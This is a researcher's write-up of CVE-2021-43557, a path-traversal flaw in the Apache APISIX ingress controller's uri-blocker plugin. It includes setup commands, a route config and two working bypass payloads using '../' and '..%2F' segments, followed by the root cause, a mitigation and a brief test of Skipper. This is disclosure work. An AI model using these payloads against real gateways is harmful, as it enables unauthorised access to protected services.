In this article I will present my research on insecure usage of `$request_uri` variable in [Apache APISIX](https://github.com/apache/apisix-ingress-controller/) ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short [Skipper](https://github.com/zalando/skipper) which I tested for same problem.

What is APISIX ? From official website:

> Apache APISIX is a dynamic, real-time, high-performance API gateway.
> APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.

Why `$request_uri` ? This [variable](https://nginx.org/en/docs/http/ngx_http_core_module.html#var_request_uri) is many times used in authentication and authorization plugins. It's **not normalized**, so giving a possibility to bypass some restrictions. 

In Apache APISIX there is no typical functionality of external authentication/authorization. You can write your own plugin, but it's quite complicated. To prove that APISIX is vulnerable to path-traversal I will use `uri-blocker` plugin. I'm suspecting that other plugins are also vulnerable but this one is easy to use.

## Setting the¬†stage

Install APISIX into Kubernetes. Use helm chart with version **0.7.2**:

```bash
helm repo add apisix https://charts.apiseven.com
helm repo add bitnami https://charts.bitnami.com/bitnami
helm repo update
kubectl create ns ingress-apisix
helm install apisix apisix/apisix \
  --set gateway.type=NodePort \
  --set ingress-controller.enabled=true \
  --namespace ingress-apisix \
  --version 0.7.2
kubectl get service --namespace ingress-apisix
```

In case of problems follow [official guide](https://github.com/apache/apisix-ingress-controller/blob/master/docs/en/latest/deployments/minikube.md).

To create *ingress route*, you need to deploy `ApisixRoute` resource:

```yaml
apiVersion: apisix.apache.org/v2beta1
kind: ApisixRoute
metadata:
  name: public-service-route
spec:
  http:
  - name: public-service-rule
    match:
      hosts:
      - app.test
      paths:
      - /public-service/*
    backends:
        - serviceName: public-service
          servicePort: 8080
    plugins:
      - name: proxy-rewrite
        enable: true
        config:
          regex_uri: ["/public-service/(.*)", "/$1"]
  - name: protected-service-rule
    match:
      hosts:
      - app.test
      paths:
      - /protected-service/*
    backends:
        - serviceName: protected-service
          servicePort: 8080
    plugins:
      - name: uri-blocker
        enable: true
        config:
          block_rules: ["^/protected-service(/?).*"]
          case_insensitive: true
      - name: proxy-rewrite
        enable: true
        config:
          regex_uri: ["/protected-service/(.*)", "/$1"]
```

Let's dive deep into it:

- it creates routes for `public-service` and `private-service`
- there is `proxy-rewrite` turned on to remove prefixes
- there is `uri-blocker` plugin configured for `protected-service`. It can look like mistake but this plugin it about to block any requests starting with `/protected-service` üòÄ

## Exploitation

I'm using APISIX in version **2.10.0**.

Reaching out to APISIX routes in minikube is quite inconvenient: `kubectl exec -it -n ${namespace of Apache APISIX} ${Pod name of Apache APISIX} -- curl --path-as-is http://127.0.0.1:9080/public-service/public -H 'Host: app.test'`. To ease my pain I will write small script that will work as template:

```bash
#/bin/bash

kubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H 'Host: app.test'
```

In your case replace `apisix-dc9d99d76-vl5lh` with name of actual APISIX pod.

Let's start with validation if routes and plugins are working as expected:

```bash
$ ./apisix_request.sh "/public-service/public"
Defaulted container "apisix" out of: apisix, wait-etcd (init)
{"data":"public data"}
```

```bash
$ ./apisix_request.sh "/protected-service/protected"
Defaulted container "apisix" out of: apisix, wait-etcd (init)
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>openresty</center>
</body>
</html>
```

Yep. `public-service` is available and `protected-service` is blocked by plugin.

Now let's test payloads:

```bash
$ ./apisix_request.sh "/public-service/../protected-service/protected"
Defaulted container "apisix" out of: apisix, wait-etcd (init)
{"data":"protected data"}
```

and second one:

```bash
$ ./apisix_request.sh "/public-service/..%2Fprotected-service/protected"
Defaulted container "apisix" out of: apisix, wait-etcd (init)
{"data":"protected data"}
```

As you can see in both cases I was able to bypass uri restrictions üòÑ

### Root cause

`uri-blocker` plugin is using `ctx.var.request_uri` variable in logic of making blocking decision. You can check it in [code](https://github.com/apache/apisix/blob/11e7824cee0e4ab0145ea7189d991464ade3682a/apisix/plugins/uri-blocker.lua#L98):

{{< figure src="https://user-images.githubusercontent.com/17719543/140750129-f32e9acc-2f4b-42d9-b565-d52d44fe0504.png" >}}

### Impact

- attacker can bypass access control restrictions and perform successful access to routes that shouldn't be able to,
- developers of custom plugins have no knowledge that `ngx.var.request_uri` variable is untrusted.

Search for usage of `var.request_uri` gave me a hint that maybe [authz-keycloak plugin](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/authz-keycloak.md) is affected. You can see [this code](https://github.com/apache/apisix/blob/a3d42e66f60673e408cab2e2ceedc58aee450776/apisix/plugins/authz-keycloak.lua#L578), it looks really nasty. If there is no normalization on keycloak side, then there is high potential for vulnerablity. 

### Mitigation

In case of custom plugins, I suggest to do path normalization before using `ngx.var.request_uri` variable. There are also two other variables, high probably normalized, to check `ctx.var.upstream_uri` and `ctx.var.uri`.

## Skipper

Skipper is another ingress controller that I have investigated. It's not easy to install it in kubernetes, because deployment guide and helm charts are outdated. Luckily I have found issue page where developer was describing how to install it. This ingress gives possibility to implement external authentication based on [webhook filter](https://opensource.zalando.com/skipper/reference/filters/#webhook):

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: my-ingress
  annotations:
    zalando.org/skipper-filter: |
      modPath("^/.*/", "/") -> setRequestHeader("X-Auth-Request-Redirect", "${request.path}") -> webhook("http://auth-service.default.svc.cluster.local:8080/verify")
```

To add some interesting headers that could help in access control decision, you need to do it manually with `setRequestHeader` filter. There is template available to inject variable by `${}`. Sadly (for attackers) `${request.path}` is having normalized path üòê I see in code that developers are not using *easily* `RequestURI` or `originalRequest`. 

I wasn't able to exploit path traversal in this case. Skipper remains safe.

## Summary

Apache APISIX is vulnerable for path traversal. It's not affecting any external authentication, but plugins that are using `ctx.var.request_uri` variable.
